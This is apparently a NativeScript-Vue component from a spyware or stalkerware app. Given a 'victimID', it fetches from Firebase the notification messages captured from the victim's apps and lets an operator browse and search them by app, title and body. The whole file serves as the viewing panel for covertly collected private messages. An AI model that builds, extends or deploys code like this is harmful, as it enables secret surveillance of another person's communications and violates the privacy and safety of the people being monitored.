<template>
  <page class="bg-white" actionBarHidden="true">
    <GridLayout rows="*" columns="*">
      <ActivityIndicator
        v-if="isLoading"
        :busy="isLoading"
        verticalAlignment="center"
        textAlignment="center"
      />
      <StackLayout>
        <GridLayout v-show="!selectedAppName" rows="auto,*" columns="*">
          <StackLayout class="bg-dark-orange">
            <CardView elevation="10" margin="15">
              <SearchBar row="0" hint="App name..." v-model="appSearchPhrase" />
            </CardView>
          </StackLayout>
          <ListView
            @itemTap="selectApp"
            class="m-x-15"
            row="1"
            for="collectionName in collectionNames.filter(v => v && (v.toLowerCase().indexOf(appSearchPhrase.toLowerCase()) >=0 || appSearchPhrase.length < 2))"
          >
            <v-template>
              <Label class="p-15" :text="collectionName" />
            </v-template>
          </ListView>
        </GridLayout>
        <GridLayout rows="auto,*,auto" v-if="selectedAppName">
          <StackLayout class="bg-dark-orange">
            <CardView @tap="selectedAppName = null" elevation="10" margin="15">
              <GridLayout columns="*,auto">
                <label class="p-5" :fontSize="18" verticalAlignment="center" :text="selectedAppName" />
                <Label
                  col="1"
                  :text="'mdi-close' | fonticon"
                  verticalAlignment="center"
                  :fontSize="30"
                  class="mdi m-10"
                />
              </GridLayout>
            </CardView>
          </StackLayout>
          <ActivityIndicator
            row="1"
            rowSpan="2"
            v-if="isLoadingMessages"
            :busy="isLoadingMessages"
            verticalAlignment="center"
            textAlignment="center"
          />
          <ListView 
            @loadMoreItems="loadMoreMessages"
            for="msg in allMessages[selectedAppName].filter(v => v && (JSON.stringify(v).toLowerCase().indexOf(appSearchInApp.toLowerCase()) >=0 || appSearchInApp.length < 2))" 
            v-show="!isLoadingMessages" 
            row="1">
            <v-template class="">
              <CardView
                elevation="5"
                class="m-10 p-10"
              >
                <GridLayout rows="auto,auto,auto" columns="auto,*">
                  <label
                    rowSpan="3"
                    class="mdi m-10"
                    verticalAlignment="center"
                    textAlignment="center"
                    :fontSize="35"
                    :text="'mdi-message' | fonticon"
                  ></label>
                  <label
                    col="1"
                    class="p-5 t-14 font-weight-bold"
                    :textWrap="true"
                    :text="msg.title"
                  ></label>
                  <label row="1" col="1" class="p-5" :textWrap="true" :text="msg.body"></label>
                  <label
                    row="2"
                    col="1"
                    textAlignment="right"
                    class="p-10"
                    :fontSize="12"
                    :text="getMoment(msg.date).fromNow()"
                  ></label>
                </GridLayout>
              </CardView>
            </v-template>
          </ListView>
          <ActivityIndicator
            row="2"
            v-if="isLoadingMoreMessages"
            :busy="isLoadingMoreMessages"
            verticalAlignment="center"
            textAlignment="center"
          />
          <CardView v-show="!isLoadingMoreMessages" row="2" elevation="10" margin="15">
            <SearchBar row="0" hint="Search..." v-model="appSearchInApp" />
          </CardView>
        </GridLayout>
      </StackLayout>
    </GridLayout>
  </page>
</template>

<script lang="ts">
export default {
  data() {
    return {
      appSearchPhrase: "",
      appSearchInApp: "",
      selectedIndex: -1,
      selectedAppName: "",
      collectionNames: [],
      allMessages: {},
      isLoadingMessages:false,
      isLoadingMoreMessages:false
    };
  },
  props: ["victimID"],
  mounted() {
    if (!this.victimID) {
      return this.navigate(null);
    }
    this.isLoading = true;
    this.$firebase
      .getApplicationNamesToCollection(this.victimID)
      .then(doc => {
        this.collectionNames =
          doc && doc["application-names"]
            ? doc["application-names"].sort()
            : [];
        this.isLoading = false;
        this.collectionNames.forEach(name => {
          if (!this.allMessages.hasOwnProperty(name)) {
            this.allMessages[name] = [];
          }
        });
      })
      .catch(err => {
        console.log("An error has occured", err);
        this.isLoading = false;
      });
  },
  methods: {
    loadMoreMessages(e){
      if(this.appSearchInApp.length > 0 || this.isLoadingMoreMessages){
        return;
      }
      const lastDoc = this.allMessages[this.selectedAppName];
      const lastDocId = lastDoc && lastDoc.length > 0 && lastDoc[lastDoc.length -1].doc ? lastDoc[lastDoc.length -1].doc : null;
      if(!lastDocId){
        return;
      }
      this.isLoadingMoreMessages = true;
       this.$firebase
        .getMessagesFromCollection(this.victimID, this.selectedAppName,lastDocId)
        .then(allDocs => {
          this.isLoadingMoreMessages = false;
          if(allDocs && allDocs.length > 0){
            this.allMessages[this.selectedAppName] = this.allMessages[this.selectedAppName].concat(allDocs);
          }
          console.log("All data is in", allDocs);
        })
        .catch(err => {
          console.log("An error has occured", err);
          this.isLoadingMoreMessages = false;
        });
    },
    selectApp(obj) {
      const selectedAppName = obj.item;
      this.selectedAppName = selectedAppName;
      this.appSearchPhrase = selectedAppName;
      this.isLoadingMessages = true;
      this.$firebase
        .getMessagesFromCollection(this.victimID, selectedAppName)
        .then(allDocs => {
          this.isLoadingMessages = false;
          this.allMessages[selectedAppName] = allDocs;
          console.log("All data is in", allDocs);
        })
        .catch(err => {
          console.log("An error has occured", err);
          this.isLoadingMessages = false;
        });
    },
    searchTap() {}
  }
};
</script>

<style lang="scss" scoped>
$blue: #74b9ff;

.highlight-under {
  border-bottom-width: 2;
  border-bottom-color: white;
}

.chat-bubble {
  padding: 10px 14px;
  background: #eee;
  margin: 10px 30px;
  border-radius: 9px;
  position: relative;
  animation: fadeIn 1s ease-in;

  &:after {
    content: "";
    position: absolute;
    top: 50%;
    width: 0;
    height: 0;
    border: 20px solid transparent;
    border-bottom: 0;
    margin-top: -10px;
  }

  &--left {
    &:after {
      left: 0;
      border-right-color: #eee;
      border-left: 0;
      margin-left: -20px;
    }
  }

  &--right {
    &:after {
      right: 0;
      border-left-color: $blue;
      border-right: 0;
      margin-right: -20px;
    }
  }
}
</style>